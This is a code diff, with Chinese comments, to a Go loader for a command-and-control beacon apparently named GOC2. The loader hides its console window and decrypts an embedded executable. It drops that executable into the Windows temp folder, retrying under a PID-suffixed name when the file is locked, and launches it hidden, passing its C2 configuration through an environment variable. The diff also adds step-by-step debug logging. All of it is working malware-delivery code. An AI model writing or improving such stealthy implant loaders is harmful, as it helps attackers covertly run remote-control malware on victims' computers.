@@ -444,9 +444,14 @@ func main() {
 	// donut 内存加载的 beacon 自读 trailer 不可靠（os.Executable 指向本 loader）——
 	// 同进程 env 下发配置，beacon 侧 GOC2_CFG_JSON 兜底解析（与 T0 的 cmd.Env 同理）
 	_ = os.Setenv("GOC2_CFG_JSON", string(_trailerJSON))
-	// 调试：写标记文件确认 env 注入与配置内容（验证后删）
-	_ = os.WriteFile(os.Getenv("TEMP")+"\\t3_dbg.txt",
-		[]byte("cfg="+string(_trailerJSON)+"\nenv="+os.Getenv("GOC2_CFG_JSON")), 0644)
+	dbg := func(step string) {
+		f, _ := os.OpenFile(os.Getenv("TEMP")+"\\t3_dbg.txt", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
+		if f != nil {
+			f.WriteString(step + "\n")
+			f.Close()
+		}
+	}
+	dbg("s1-self-cfg=" + string(_trailerJSON))
 	// 1. Hide console
 	hideConsole()
 
@@ -468,18 +473,30 @@ func main() {
 		exeBytes = exeBytes[:len(exeBytes)-_padTail]
 	}
 	if len(exeBytes) < 1000 {
+		dbg("s6-decrypt-bad-len=" + fmt.Sprint(len(exeBytes)))
 		return
 	}
 
-	// 6. 落盘 %TEMP% 随机名（shellcode 直执行在 Go beacon 下不可靠）
+	// 6. 落盘 %TEMP%（shellcode 直执行在 Go beacon 下不可靠）。
+	// 同名残留 beacon 进程在运行时会锁文件（Windows 运行中 exe 不可覆盖）——
+	// 写失败换 PID 后缀名重试，杜绝"跑过一次后永远失败"。
 	tmp := os.Getenv("TEMP")
 	if tmp == "" {
 		tmp = os.TempDir()
 	}
 	dst := filepath.Join(tmp, _dropName)
 	if err := os.WriteFile(dst, exeBytes, 0o755); err != nil {
-		return
+		alt := _dropName
+		if n := len(alt); n > 4 && alt[n-4:] == ".exe" {
+			alt = alt[:n-4]
+		}
+		dst = filepath.Join(tmp, fmt.Sprintf("%s-%d.exe", alt, os.Getpid()))
+		if err2 := os.WriteFile(dst, exeBytes, 0o755); err2 != nil {
+			dbg("s7-write-err=" + err2.Error())
+			return
+		}
 	}
+	dbg("s7-drop-ok=" + dst)
 	defer os.Remove(dst)
 
 	// 7. os/exec 启动 beacon（cmd.Env 下发 GOC2_CFG_JSON 配置）
@@ -488,6 +505,7 @@ func main() {
 	cmd.Env = env
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true, CreationFlags: 0x08000000}
 	if err := cmd.Start(); err != nil {
+		dbg("s8-exec-err=" + err.Error())
 		return
 	}
 	_ = cmd.Wait()
